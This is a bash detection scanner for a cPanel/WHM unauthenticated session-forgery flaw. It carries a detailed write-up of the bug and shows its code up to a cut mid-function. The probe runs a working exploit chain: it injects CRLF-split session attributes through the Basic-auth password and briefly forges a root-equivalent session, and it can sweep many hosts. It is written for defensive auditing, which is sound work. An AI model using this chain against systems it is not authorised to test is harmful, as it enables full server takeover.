#!/bin/bash
#
##
# sessionscribe-remote-probe.sh v2.1.0
#             (C) 2026, R-fx Networks <proj@rfxn.com>
# This program may be freely redistributed under the terms of the GNU GPL v2
##
#
# sessionscribe-remote-probe.sh   v2.1.0
#
# Detection probe for CVE-2026-41940 (SessionScribe - disclosed 2026-04-28,
# cPanel KB 40073787579671). Unauthenticated session forgery in cPanel/WHM
# via CRLF injection into the password field of a preauth session.
#
# ============================================================================
# Researcher credits
# ============================================================================
#
# Two surfaces under the cPanel/WHM auth-bypass disclosure cluster (2026-04-28):
#
#   CVE-2026-41940 (SessionScribe)
#     Researcher: Sina Kheirkhah (@SinSinology) / watchTowr Labs.
#     Public PoC: github.com/watchtowrlabs/watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
#     Surface: unauthenticated session forgery via CRLF injection into the
#     password field of a preauth session. Outcome: full root.
#     This script probes only this surface (full stage 1-4 chain).
#
#   WhmScribe-A
#     Researcher: Ryan MacDonald, Nexcess Engineering <rmacdonald@nexcess.net>
#                 Ryan MacDonald, rfxn | forged in prod | <ryan@rfxn.com>
#     Surface: Authorization: WHM <user>:<token> commits username to the
#     access_log identity slot before token validation. ACL gate holds -
#     bounded to log-level identity injection (no privilege escalation).
#     Detection ships in the companion sessionscribe-ioc-scan.sh
#     (localhost-marker check) and in modsec-sessionscribe.conf rules
#     1500010/1500020/1500021. Out of scope for this remote probe.
#
# ============================================================================
# Vulnerability primitive
# ============================================================================
#
# The whostmgrsession cookie has the canonical form `:NAME,OBHEX` where:
#     NAME    random alphanumeric - the session-file basename
#     OBHEX   1-64 lowercase hex chars - the secret used to construct
#             Cpanel::Session::Encoder for the password field
#
# Cpanel/Session/Load.pm get_ob_part() (line 122) extracts OBHEX:
#     if ( $$session_name_ref =~ s/,([0-9a-f]{1,64})$// ) { $ob = $1; }
#
# Any cookie shape that fails this regex leaves $ob undef, which on line 93
# short-circuits the encoder construction:
#     my $encoder = $ob && Cpanel::Session::Encoder->new('secret' => $ob);
#
# With $encoder unset, saveSession() writes the password field VERBATIM into
# the on-disk session file. An attacker controls the password via:
#     Authorization: Basic <base64(user:VALUE)>
# Embedding CR/LF inside VALUE causes the single `pass=` line to split into
# multiple `key=value` lines that become canonical session attributes:
#     pass=x
#     successful_internal_auth_with_timestamp=<now>
#     user=root
#     hasroot=1
#
# Five vulnerable cookie shapes (each failing the OBHEX regex):
#     :NAME                       no comma
#     :NAME,                      trailing comma, empty OBHEX
#     :NAME,GHIJ                  non-hex tail
#     :NAME,ABCDEF                uppercase hex
#     :NAME,<65-char hex tail>    OBHEX too long
#
# Combined with successful_internal_auth_with_timestamp=<now>, cpsrvd treats
# the next request as logged-in. Outcome: full session forgery to root.
#
# ============================================================================
# Patch mechanism (vendor advisory KB 40073787579671)
# ============================================================================
#
# Fixed cpsrvd writes `pass=no-ob:<hex>` via hex_encode_only when ob_part is
# missing - every byte (including CR/LF) becomes ASCII hex, never standalone
# session attributes. Patched Cpanel/Session/Load.pm has a companion `no-ob:`
# branch on the load side. Patched builds:
#     11.110.0.97   11.118.0.63   11.126.0.54
#     11.132.0.29   11.134.0.20   11.136.0.5
# Tiers 112/114/116/120/122/124/128/130 have NO patch - operators must
# upgrade the major series, migrate, or firewall direct cpsrvd ports
# (2082/2083/2086/2087/2095/2096).
#
# ============================================================================
# Detection chain
# ============================================================================
#
# Stage 1   POST /login/?login_only=1   user=root&pass=wrong
#             → mint preauth whostmgrsession cookie (`:NAME,OBHEX`)
#
# Stage 2   GET /
#             Authorization: Basic <b64( root:x\r\n
#                 successful_internal_auth_with_timestamp=<now>\r\n
#                 hasroot=0\r\n
#                 nxesec_canary_<nonce>=1 )>
#             Cookie: whostmgrsession=:NAME           (OBHEX stripped)
#             → 307 + Location: /cpsess<10>/         (necessary, not sufficient)
#           NOTE: cpsrvd 307s ANY cookie-bearing request to /cpsess<token>/
#                 as URL canonicalization. Stage 2 alone yields false
#                 positives on patched hosts (this is why v1's stage-2-only
#                 verdict was structurally wrong).
#
# Stage 3   GET /scripts2/listaccts   Cookie: whostmgrsession=:NAME
#             → 401 "Token denied" - propagates raw→cache so the cpsess
#               token from stage 2's Location becomes readable
#
# Stage 4   GET /cpsess<token>/json-api/version   Cookie: whostmgrsession=:NAME
#             → HTTP 200 + version JSON         VULN (bypass landed)
#             → HTTP 5xx with "License" body    VULN (license-gated past auth)
#             → HTTP 401/403                    SAFE (stage 2 was canonicalization)
#
# Stage 5   GET /cpsess<token>/logout + GET /logout   (best-effort invalidate)
#
# ============================================================================
# Safety boundary
# ============================================================================
#
# Stage 3's listaccts handler writes user=root into the session as an
# unconditional side effect; this is intrinsic to the gadget, not a probe
# choice. The forged session is therefore root-equivalent for the window
# between stage 3 and stage 5 logout (typ. 1-3s). The probe deliberately:
#   - injects NO user= override (cpsrvd's user= dedup is first-wins on
#     some versions and last-wins on others; omitting it avoids
#     inconsistent cross-version behavior in the session file)
#   - injects hasroot=0 explicitly (defense-in-depth; honored where
#     last-write wins on hasroot)
#   - performs NO state-changing API calls (no /scripts/passwd, no
#     /json-api/createacct, no /Shell, no /CommandStream, no UAPI mutators)
#   - reads only /json-api/version (the lowest-information JSON-API endpoint)
#   - actively invalidates via /cpsess<token>/logout + /logout
#   - tags every forged session with `nxesec_canary_<nonce>=1` for forensic
#     correlation
#
# For read-only audits where no privileged session window is tolerable, use
# --no-verify (stage 1+2 only). NOTE: --no-verify reverts to the pre-v2
# stage-2 heuristic, which produces FALSE POSITIVES on patched hosts -
# every cookie-bearing request returns 307 + /cpsess<token>/ regardless of
# patch state because the redirect is normal URL canonicalization.
#
# ============================================================================
# Cleanup
# ============================================================================
#
# Stage 5 logout invalidates the forged session on cpsrvd; if it fails,
# sessions expire on the natural cpsrvd idle timeout (~30 min). To remove
# session files immediately, run `--cleanup` to emit the wildcard remover
# (matches `nxesec_canary_*`) and execute it as root on each formerly-VULN
# target. The cleanup operation is:
#
#     grep -l "nxesec_canary_" \
#          /var/cpanel/sessions/raw/* \
#          /var/cpanel/sessions/cache/* \
#          /var/cpanel/sessions/preauth/* 2>/dev/null \
#       | while read f; do
#           n=$(basename "$f")
#           rm -f "/var/cpanel/sessions/raw/$n" \
#                 "/var/cpanel/sessions/cache/$n" \
#                 "/var/cpanel/sessions/preauth/$n"
#         done
#
# ============================================================================
# Output modes
# ============================================================================
#   default     pretty per-probe lines + summary verdict (TTY)
#   --quiet     only [VULN] lines + final verdict line
#   --oneline   one verdict line per target (for grep/awk pipelines)
#   --csv       header + one CSV row per probe
#   --json      structured JSON with probe-level results + per-target rollup
#   --cleanup   print the local cleanup command and exit (no probing)
#
# ============================================================================
# Exit codes
# ============================================================================
#   0   no VULN found
#   1   inconclusive results only
#   2   one or more VULN targets found
#
# Dependencies: bash 4+, curl, coreutils (base64, awk, grep, sed, tr, od, mktemp).
# No python, no perl, no openssl.

set -u
SCRIPT_VERSION="2.1.0"

# --- Defaults ---
TIMEOUT=10
CONNECT_TIMEOUT=5
OUTPUT_MODE="text"   # text | quiet | oneline | csv | json
ALL_PERMUTATIONS=0
PROXY_DOMAIN=""
FORCED_PORT=""
FORCED_HOST_HEADER=""
FORCED_SCHEME=""
AUTO_DISCOVER_HOST=0
NO_COLOR_FLAG=0
PROGRESS=1
NO_VERIFY=0    # --no-verify: stage-2-only mode (v1 heuristic; produces false positives)
EMIT_CLEANUP=0 # --cleanup: print local cleanup command and exit (no probing)
TARGETS=()

# --- Per-run nonces ---
NONCE=$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')
NONCE="${NONCE:-$(printf '%08x' $((RANDOM*RANDOM)))}"
CANARY="nxesec_canary_${NONCE}"
UA="nxesec-cve-2026-41940-probe/${SCRIPT_VERSION}"

# Verdict labels
V_VULN="VULN"
V_SAFE="SAFE"
V_INCONCLUSIVE="INCONCLUSIVE"
V_SKIP="SKIP"

# --- Color + glyph setup (polyshell-style: TTY detection + NO_COLOR honoring) ---
RULE_WIDTH=74
init_colors() {
  if [[ -t 1 ]] && [[ "$NO_COLOR_FLAG" -eq 0 ]] && [[ "${NO_COLOR:-0}" = "0" ]]; then
    RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; YELLOW=$'\033[1;33m'
    CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; DIM=$'\033[2m'; NC=$'\033[0m'
    ICON_VULN="❌"; ICON_SAFE="✅"; ICON_INC="⚠ "; ICON_SKIP="⬜"; ICON_INFO="ℹ "
    BOX_TL="┌"; BOX_BL="└"; BOX_H="─"; BOX_V="│"; BAR="▌"
    RULE_DOUBLE_CH="═"; RULE_SINGLE_CH="─"
  else
    RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; DIM=''; NC=''
    ICON_VULN="!!"; ICON_SAFE="ok"; ICON_INC="?!"; ICON_SKIP="--"; ICON_INFO="**"
    BOX_TL="+"; BOX_BL="+"; BOX_H="-"; BOX_V="|"; BAR=">"
    RULE_DOUBLE_CH="="; RULE_SINGLE_CH="-"
  fi
  local i
  RULE_DOUBLE=""; RULE_SINGLE=""
  for ((i=0; i<RULE_WIDTH; i++)); do
    RULE_DOUBLE+="$RULE_DOUBLE_CH"
    RULE_SINGLE+="$RULE_SINGLE_CH"
  done
}

# --- Result accumulators ---
declare -a R_DESC=()
declare -a R_TARGET=()
declare -a R_VERDICT=()
declare -a R_HTTPCODE=()
declare -a R_LOCATION=()
declare -a R_DETAIL=()
declare -a R_SCHEME=()
declare -a R_HOST=()
declare -a R_PORT=()
declare -a R_HOSTHDR=()

# Per-target verdict aggregation (highest-severity wins: VULN > INCONCLUSIVE > SAFE)
declare -A TARGET_VERDICT=()
declare -a TARGET_ORDER=()

# Counters
N_VULN=0
N_SAFE=0
N_SKIP=0
N_INC=0
N_TOTAL=0

usage() {
  cat <<EOF
sessionscribe-remote-probe.sh v${SCRIPT_VERSION} - detection probe for CVE-2026-41940 (SessionScribe)

Usage:
  $0 --target HOST [--port PORT] [--scheme https|http] [--host-header NAME]
  $0 --target HOST --proxy DOMAIN
  $0 --target HOST --all
  $0 --target HOST1 --target HOST2 ...
  cat hosts.txt | $0 --                                    # batch via stdin

Targeting:
  --target HOST            IP, hostname, or [::1] for IPv6 (repeatable)
  --port PORT              Direct cpsrvd port (default WHM ports if not set)
  --scheme https|http      Default https
  --host-header NAME       Override Host: header
  --proxy DOMAIN           Test {whm,cpanel,webmail}.DOMAIN via 443 + 80
  --all                    Exhaustive sweep - all 6 cpsrvd direct ports
                           (cPanel/Webmail probes are informational only;
                            see "Known limitation" in the script header)
  --auto-host-discover     Pre-probe /openid_connect/cpanelid for canonical Host

Output modes (mutually exclusive - last one wins):
  (default)                Pretty per-probe output + summary
  -q | --quiet             Only print [VULN] hits and the final verdict line
  --oneline                One verdict line per target ("HOST: VULN n=2")
  --csv                    CSV header + one row per probe
  --json                   Structured JSON with probe results + per-target rollup
  --no-color               Disable ANSI color (also honored if env NO_COLOR=1)
  --no-progress            Suppress progress lines on multi-target runs
  --no-verify              Stage-2-only mode (v1 heuristic - NOTE: produces
                           FALSE POSITIVES on patched hosts; cpsrvd 307s any
                           cookie-bearing request to /cpsess<token>/ as URL
                           canonicalization. Use only for read-only audits.
  --cleanup                Print the local cleanup command (matches all past
                           probe canaries: nxesec_canary_*) and exit. No
                           probing performed. Pipe through ssh or run as
                           root on each formerly-VULN target.

Tuning:
  --timeout N              Per-request timeout seconds (default ${TIMEOUT})
  --connect-timeout N      TCP connect timeout (default ${CONNECT_TIMEOUT})

Exit codes:
  0  no vulnerable targets found
  1  inconclusive results only (no VULN, but at least one INCONCLUSIVE)
  2  one or more VULN targets found

Examples:
  # single direct WHM-SSL probe with verbose summary
  $0 --target 1.2.3.4 --port 2087

  # apache proxy test (whm./cpanel./webmail.example.com → 1.2.3.4:443)
  $0 --target 1.2.3.4 --proxy example.com

  # exhaustive sweep, JSON to file
  $0 --target 1.2.3.4 --proxy example.com --all --json > result.json

  # fleet - quiet mode, exit 2 if any VULN, easy to chain in scripts
  for h in \$(cat fleet.txt); do
    $0 --target "\$h" --quiet --no-color || echo "\$h FOUND_VULN"
  done

  # fleet - CSV aggregation across many targets
  ( $0 --csv \$(cat fleet.txt | sed 's/^/--target /' | xargs) ) > fleet-results.csv

  # batch via stdin
  printf 'host1\nhost2\nhost3\n' | $0 --

Detection mechanism (full chain - default):
  Stage 1   POST /login/?login_only=1  user=root&pass=wrong
            → server returns Set-Cookie: whostmgrsession=<sessname>,<obhex>
  Stage 2   GET / with:
              Authorization: Basic <b64(root:x\\r\\nsuccessful_internal_auth_*\\r\\n…)>
              Cookie: whostmgrsession=<sessname>   (ob_part stripped)
            → on vulnerable cpsrvd, saveSession writes the CRLF lines as
              session attributes (the encoder short-circuits when ob_part
              is missing); 307 + /cpsess<token>/ in Location
            → on patched cpsrvd, hex_encode_only folds the CRLFs into
              pass=no-ob:<hex>; the same 307 + /cpsess/ still emits as
              URL canonicalization (false-positive trap for stage-2-only)
  Stage 3   GET /scripts2/listaccts  Cookie: whostmgrsession=<sessname>
            → 401 "Token denied" gadget; cpsrvd propagates raw→cache
            → side effect: writes user=root to session (unavoidable)
  Stage 4   GET <cpsess>/json-api/version  Cookie: whostmgrsession=<sessname>
            → HTTP 200 + version JSON  → VULN  (bypass landed)
            → HTTP 5xx + "License"     → VULN  (license-gated past auth)
            → HTTP 401 / 403           → SAFE  (stage 2 was canonicalization)
  Stage 5   GET <cpsess>/logout + GET /logout - best-effort invalidate

Safety: stages 3-5 create a forged session that is root-equivalent for the
~1-3s window between stage 3 and stage 5. No state-changing API calls are
performed (no passwd, no createacct). Forged sessions carry a unique
nxesec_canary_<nonce> attribute for forensic recovery.
EOF
}

# === Helpers (polyshell-style) ===

log_v()   { [[ "$OUTPUT_MODE" = "text" ]] && [[ "${VERBOSE:-0}" = "1" ]] && printf '%s[v]%s %s\n' "$DIM" "$NC" "$*" >&2 || true; }
log_w()   { printf '%s[!]%s %s\n' "$YELLOW" "$NC" "$*" >&2; }

log_info() {
  case "$OUTPUT_MODE" in
    text)    printf ' %s%s%s  %s\n' "$CYAN" "$ICON_INFO" "$NC" "$1" ;;
  esac
}

section_header() {
  case "$OUTPUT_MODE" in
    text) printf '\n %s━━━ %s%s\n\n' "$BOLD" "$1" "$NC" ;;
  esac
}

# Strip "DIRECT-"/"PROXY-" prefix and "@host[:port]" suffix from desc to get
# the short role label (WHM-SSL, cPanel, webmail-SSL, etc.) for column display.
short_role() {
  local d=$1
  d="${d%%@*}"
  d="${d#DIRECT-}"
  d="${d#PROXY-}"
  printf '%s' "$d"
}

# Scheme cell - 5 chars, padded so http aligns under https
scheme_cell() {
  case "$1" in
    https) printf 'https' ;;
    http)  printf 'http ' ;;
    *)     printf '%-5s' "$1" ;;
  esac
}

# Port cell - ":2087" or empty (proxy mode uses 443/80 implicitly via host hdr)
port_cell() {
  local p=$1
  [[ -z "$p" ]] && p="-"
  printf ':%-5s' "$p"
}

# Box-drawing helpers (text mode)
box_top() {
  local name=$1
  local prefix="${BOX_TL}${BOX_H} ${name} "
  local plen=${#prefix}
  local fill_len=$(( RULE_WIDTH - plen ))
  [[ $fill_len -lt 0 ]] && fill_len=0
  local fill="" i
  for ((i=0; i<fill_len; i++)); do fill+="$BOX_H"; done
  printf '\n  %s%s%s%s\n' "$BOLD" "$prefix" "$fill" "$NC"
  printf '  %s%s%s\n' "$DIM" "$BOX_V" "$NC"
}

box_bottom() {
  local fill="" i
  for ((i=0; i<RULE_WIDTH-1; i++)); do fill+="$BOX_H"; done
  printf '  %s%s%s\n' "$DIM" "$BOX_V" "$NC"
  printf '  %s%s%s%s\n' "$DIM" "$BOX_BL" "$fill" "$NC"
}

urldecode() {
  local s="${1//+/ }"
  printf '%b' "${s//%/\\x}"
}

urlencode_cookie() {
  local s="$1"
  s="${s//%/%25}"; s="${s//:/%3a}"; s="${s//,/%2c}"; s="${s//;/%3b}"; s="${s// /%20}"
  printf '%s' "$s"
}

base64_oneline() { base64 -w0 2>/dev/null || base64 | tr -d '\n'; }

# Build URL with IPv6 bracket awareness
build_url() {
  local sch=$1 host=$2 port=$3
  if [ -n "$port" ]; then
    case "$host" in
      *:*) printf '%s://[%s]:%s' "$sch" "$host" "$port" ;;
      *)   printf '%s://%s:%s' "$sch" "$host" "$port" ;;
    esac
  else
    case "$host" in
      *:*) printf '%s://[%s]' "$sch" "$host" ;;
      *)   printf '%s://%s' "$sch" "$host" ;;
    esac
  fi
}

# === Stage 1: mint preauth session ===
# resolve_pin (optional) is passed to curl --resolve as HOSTNAME:PORT:IP so
# proxy-domain probes get SNI right under HTTP/2's strict-Host enforcement
# (Apache 2.4 returns 421 Misdirected Request if SNI != Host header).
#
# Emits "<reason>|<cookie>" on stdout. On success: "ok|<cookie-value>".
# On failure: reason is one of:
#   dns_failed         - couldn't resolve host (curl exit 6)
#   connect_refused    - TCP refused (curl exit 7, fast)
#   connect_timeout    - TCP timed out (curl exit 7/28; port firewalled)
#   tls_failed         - SSL/TLS handshake failed (curl exits 35/52/56/60)
#   http_421           - Apache HTTP/2 SNI≠Host (Misdirected Request)
#   http_<code>_no_cookie  - got a status, but no whostmgrsession cookie
#   transport_<code>   - other curl exit code
mint_preauth() {
  local url=$1 host_hdr=$2 resolve_pin=${3:-}
  local hdr_file
  hdr_file=$(mktemp 2>/dev/null) || hdr_file="/tmp/nxesec-hdr-$$-$RANDOM"
  local args=(
    --silent --insecure --max-time "$TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close' -H 'Accept: */*'
    --data 'user=root&pass=wrong'
    -D "$hdr_file" -o /dev/null
  )
  [ -n "$host_hdr" ]    && args+=(-H "Host: ${host_hdr}")
  [ -n "$resolve_pin" ] && args+=(--resolve "$resolve_pin")
  curl "${args[@]}" "${url}/login/?login_only=1" 2>/dev/null
  local rc=$?
  if [ "$rc" -ne 0 ]; then
    rm -f "$hdr_file"
    case "$rc" in
      6)        printf 'dns_failed|';        return 0 ;;
      7)        printf 'connect_refused|';   return 0 ;;
      28)       printf 'connect_timeout|';   return 0 ;;
      35|52|56|60) printf 'tls_failed|';     return 0 ;;
      *)        printf 'transport_%d|' "$rc"; return 0 ;;
    esac
  fi
  local status cookie loc
  status=$(head -1 "$hdr_file" | tr -d '\r' | awk '{print $2}')
  cookie=$(tr -d '\r' < "$hdr_file" \
    | grep -i '^Set-Cookie:.*whostmgrsession=' | head -1 \
    | sed -E 's/^[Ss]et-[Cc]ookie:[[:space:]]*whostmgrsession=([^;]+).*/\1/')
  loc=$(tr -d '\r' < "$hdr_file" \
    | grep -i '^Location:' | head -1 | sed -E 's/^[Ll]ocation:[[:space:]]*//')
  rm -f "$hdr_file"
  if [ -n "$cookie" ]; then
    printf 'ok|%s' "$(urldecode "$cookie")"
  elif [ "$status" = "421" ]; then
    printf 'http_421|'
  elif [ -n "$status" ] && [ "${status:0:1}" = "3" ] && [[ "$loc" == https://* ]]; then
    # cpsrvd "force HTTPS" config: this surface 301s to its SSL counterpart.
    # Same daemon, same patch state - emit a SKIP signal, not INCONC.
    printf 'redirect_to_ssl|%s' "$loc"
  elif [ -n "$status" ]; then
    printf 'http_%s_no_cookie|' "$status"
  else
    printf 'transport_unknown|'
  fi
}

# === Stage 2: CRLF injection probe ===
# Payload deliberately omits user= and hasroot=1. cpsrvd's session parser
# is first-wins on 11.122 and last-wins on 11.134 for user=, so injecting
# it produces inconsistent cross-version behavior. Stage 3 propagation
# (next handler) will write user=root regardless. We inject only:
#   successful_internal_auth_with_timestamp  - gates the bypass
#   hasroot=0                                - defense-in-depth (newer respects)
#   nxesec_canary_<nonce>=1                  - forensic signature
inject_probe() {
  local url=$1 host_hdr=$2 session_base=$3 resolve_pin=${4:-}
  local now; now=$(date +%s)
  local payload
  payload=$(printf 'root:x\r\nsuccessful_internal_auth_with_timestamp=%s\r\nhasroot=0\r\n%s=1' \
    "$now" "$CANARY")
  local b64; b64=$(printf '%s' "$payload" | base64_oneline)
  local cookie_enc; cookie_enc=$(urlencode_cookie "$session_base")
  local hdr_file
  hdr_file=$(mktemp 2>/dev/null) || hdr_file="/tmp/nxesec-hdr-$$-$RANDOM"
  local args=(
    --silent --insecure --max-time "$TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close' -H 'Accept: */*'
    -H "Authorization: Basic ${b64}"
    -H "Cookie: whostmgrsession=${cookie_enc}"
    -D "$hdr_file" -o /dev/null
  )
  [ -n "$host_hdr" ]    && args+=(-H "Host: ${host_hdr}")
  [ -n "$resolve_pin" ] && args+=(--resolve "$resolve_pin")
  if ! curl "${args[@]}" "${url}/" 2>/dev/null; then
    rm -f "$hdr_file"; return 1
  fi
  local status loc
  status=$(head -1 "$hdr_file" | tr -d '\r' | awk '{print $2}')
  loc=$(tr -d '\r' < "$hdr_file" \
    | grep -i '^Location:' | head -1 | sed -E 's/^[Ll]ocation:[[:space:]]*//')
  rm -f "$hdr_file"
  printf '%s|%s' "$status" "$loc"
}

# === Stage 3: do_token_denied propagation gadget ===
# GET /scripts2/listaccts with ob-stripped cookie. cpsrvd treats the request
# as token-denied and writes the (now CRLF-injected) raw session into cache,
# making the leaked cpsess token usable for stage-4 verify. Returns HTTP
# status code (or empty on transport failure).
propagate_session() {
  local url=$1 host_hdr=$2 session_base=$3 resolve_pin=${4:-}
  local cookie_enc; cookie_enc=$(urlencode_cookie "$session_base")
  local hdr_file
  hdr_file=$(mktemp 2>/dev/null) || hdr_file="/tmp/nxesec-hdr-$$-$RANDOM"
  local args=(
    --silent --insecure --max-time "$TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close' -H 'Accept: */*'
    -H "Cookie: whostmgrsession=${cookie_enc}"
    -D "$hdr_file" -o /dev/null
  )
  [ -n "$host_hdr" ]    && args+=(-H "Host: ${host_hdr}")
  [ -n "$resolve_pin" ] && args+=(--resolve "$resolve_pin")
  curl "${args[@]}" "${url}/scripts2/listaccts" 2>/dev/null
  local status
  status=$(head -1 "$hdr_file" | tr -d '\r' | awk '{print $2}')
  rm -f "$hdr_file"
  printf '%s' "$status"
}

# === Stage 4: verify session bypass landed ===
# GET <cpsess>/json-api/version with ob-stripped cookie.
#   HTTP 200             → VULN (auth bypass landed; session is usable)
#   HTTP 5xx + "License" → VULN (license-gated but past auth)
#   HTTP 401|403         → SAFE (stage-2 307 was URL canonicalization, not bypass)
# Returns "status|body-snippet" or empty on transport failure.
verify_session() {
  local url=$1 host_hdr=$2 session_base=$3 cpsess=$4 resolve_pin=${5:-}
  local cookie_enc; cookie_enc=$(urlencode_cookie "$session_base")
  local hdr_file body_file
  hdr_file=$(mktemp 2>/dev/null) || hdr_file="/tmp/nxesec-hdr-$$-$RANDOM"
  body_file=$(mktemp 2>/dev/null) || body_file="/tmp/nxesec-body-$$-$RANDOM"
  local args=(
    --silent --insecure --max-time "$TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close' -H 'Accept: */*'
    -H "Cookie: whostmgrsession=${cookie_enc}"
    -D "$hdr_file" -o "$body_file"
  )
  [ -n "$host_hdr" ]    && args+=(-H "Host: ${host_hdr}")
  [ -n "$resolve_pin" ] && args+=(--resolve "$resolve_pin")
  if ! curl "${args[@]}" "${url}${cpsess}/json-api/version" 2>/dev/null; then
    rm -f "$hdr_file" "$body_file"; return 1
  fi
  local status body
  status=$(head -1 "$hdr_file" | tr -d '\r' | awk '{print $2}')
  # 160-char snippet, newlines/CRs flattened, double-quotes neutralized for
  # safe propagation through the |-delimited record format
  body=$(head -c 160 "$body_file" | tr '\r\n' '  ' | tr -s ' ' | tr '|' ' ' | tr '"' "'")
  rm -f "$hdr_file" "$body_file"
  printf '%s|%s' "$status" "$body"
}

# === Stage 5: best-effort session invalidation ===
# Calls /cpsess<token>/logout and /logout with the cookie. cpsrvd marks the
# session expired on logout, closing the privileged window faster than the
# default ~30 min idle timeout. Returns nothing - fire and (mostly) forget.
invalidate_session() {
  local url=$1 host_hdr=$2 session_base=$3 cpsess=$4 resolve_pin=${5:-}
  local cookie_enc; cookie_enc=$(urlencode_cookie "$session_base")
  local args=(
    --silent --insecure --max-time "$CONNECT_TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close'
    -H "Cookie: whostmgrsession=${cookie_enc}"
    -o /dev/null
  )
  [ -n "$host_hdr" ]    && args+=(-H "Host: ${host_hdr}")
  [ -n "$resolve_pin" ] && args+=(--resolve "$resolve_pin")
  curl "${args[@]}" "${url}${cpsess}/logout" 2>/dev/null || true
  curl "${args[@]}" "${url}/logout" 2>/dev/null || true
}

# === Auto-discover canonical Host header (watchTowr behavior) ===
discover_canonical() {
  local url=$1
  local hdr_file
  hdr_file=$(mktemp 2>/dev/null) || hdr_file="/tmp/nxesec-hdr-$$-$RANDOM"
  curl --silent --insecure --max-time "$TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT" \
       -A "$UA" -H 'Connection: close' -D "$hdr_file" -o /dev/null \
       "${url}/openid_connect/cpanelid" 2>/dev/null
  local loc
  loc=$(tr -d '\r' < "$hdr_file" | grep -i '^Location:' | head -1 \
    | sed -E 's/^[Ll]ocation:[[:space:]]*//')
  rm -f "$hdr_file"
  echo "$loc" | sed -nE 's|^https?://([^:/]+).*$|\1|p'
}

# === Reachability pre-check ===
reach_check() {
  local url=$1 host_hdr=$2
  local args=(
    --silent --insecure --output /dev/null
    --max-time "$CONNECT_TIMEOUT" --connect-timeout "$CONNECT_TIMEOUT"
    -A "$UA" -H 'Connection: close'
    --write-out '%{http_code}'
  )
  [ -n "$host_hdr" ] && args+=(-H "Host: ${host_hdr}")
  curl "${args[@]}" "${url}/" 2>/dev/null || echo "000"
}

# === Per-probe output (text mode) ===
# columns: │  <icon> <verdict-7>  <scheme-5>  <port-6>  <role-12>  <detail>
emit_probe_line() {
  local desc=$1 verdict=$2 detail=$3 http=$4 loc=$5
  local sch=${6:-} host=${7:-} port=${8:-} hh=${9:-}
  case "$OUTPUT_MODE" in
    text)
      local role; role=$(short_role "$desc")
      local scell; scell=$(scheme_cell "$sch")
      local pcell; pcell=$(port_cell "$port")
      local rcell; printf -v rcell '%-12s' "$role"
      case "$verdict" in
        "$V_VULN")
          printf '  %s%s%s  %s%s  %-7s%s  %s  %s  %s  %s\n' \
            "$DIM" "$BOX_V" "$NC" \
            "$RED" "$ICON_VULN" "VULN" "$NC" \
            "$scell" "$pcell" "$rcell" "${RED}${detail}${NC}"
          ;;
        "$V_SAFE")
          printf '  %s%s%s  %s%s  %-7s%s  %s  %s  %s  %s\n' \
            "$DIM" "$BOX_V" "$NC" \
            "$GREEN" "$ICON_SAFE" "SAFE" "$NC" \
            "$scell" "$pcell" "$rcell" "$detail"
          ;;
        "$V_INCONCLUSIVE")
          printf '  %s%s%s  %s%s  %-7s%s  %s  %s  %s  %s\n' \
            "$DIM" "$BOX_V" "$NC" \
            "$YELLOW" "$ICON_INC" "INCONC" "$NC" \
            "$scell" "$pcell" "$rcell" "$detail"
          ;;
        "$V_SKIP")
          printf '  %s%s%s  %s%s  %-7s  %s  %s  %s  %s%s\n' \
            "$DIM" "$BOX_V" "$NC" \
            "$DIM" "$ICON_SKIP" "SKIP" \
            "$scell" "$pcell" "$rcell" "$detail" "$NC"
          ;;
      esac
      ;;
    quiet)
      [[ "$verdict" = "$V_VULN" ]] && \
        printf ' %s%s VULN%s  %s://%s%s  %s  %s\n' \
          "$RED" "$ICON_VULN" "$NC" \
          "$sch" "$host" "${port:+:$port}" \
          "$(short_role "$desc")" "$detail"
      ;;
    csv)
      printf '%s,%s,%s,%s,%s,%s,%s,%s,"%s"\n' \
        "${host}" "${desc}" "${sch}" "${hh}" "${port}" "${verdict}" "${http}" "${loc}" "${detail//\"/\"\"}"
      ;;
    # oneline / json: don't print per-probe; emitted in summary
  esac
}

# === Record + per-target verdict roll-up ===
record_result() {
  # args: desc target verdict detail http_code location scheme host port host_hdr
  local desc=$1 target=$2 verdict=$3 detail=$4 http=$5 loc=$6 sch=$7 host=$8 port=$9 hh=${10}
  R_DESC+=("$desc"); R_TARGET+=("$target"); R_VERDICT+=("$verdict")
  R_HTTPCODE+=("$http"); R_LOCATION+=("$loc"); R_DETAIL+=("$detail")
  R_SCHEME+=("$sch"); R_HOST+=("$host"); R_PORT+=("$port"); R_HOSTHDR+=("$hh")
  N_TOTAL=$((N_TOTAL+1))
  case "$verdict" in
    "$V_VULN")         N_VULN=$((N_VULN+1)) ;;
    "$V_SAFE")         N_SAFE=$((N_SAFE+1)) ;;
    "$V_INCONCLUSIVE") N_INC=$((N_INC+1)) ;;
    "$V_SKIP")         N_SKIP=$((N_SKIP+1)) ;;
  esac
  # Per-target verdict roll-up. Severity ladder: VULN > SAFE > INCONC.
  # SAFE outranks INCONC because the patch is binary-wide: if any probed
  # surface (e.g. :2087) returns a conclusive SAFE, the host is patched
  # regardless of whether other ports (e.g. :2086) couldn't be probed.
  # SKIP is informational (e.g. force-SSL redirect) and never participates
  # in the rollup - it neither initializes nor changes the target verdict.
  if [[ "$verdict" != "$V_SKIP" ]]; then
    if [[ -z "${TARGET_VERDICT[$host]:-}" ]]; then
      TARGET_VERDICT[$host]="$verdict"
      TARGET_ORDER+=("$host")
    else
      local cur="${TARGET_VERDICT[$host]}"
      if [[ "$verdict" = "$V_VULN" ]] || \
         { [[ "$verdict" = "$V_SAFE" ]] && [[ "$cur" = "$V_INCONCLUSIVE" ]]; }; then
        TARGET_VERDICT[$host]="$verdict"
      fi
    fi
  else
    # Even on SKIP-only targets, ensure the host appears in TARGET_ORDER so
    # the box header renders correctly. Verdict stays unset → reported as
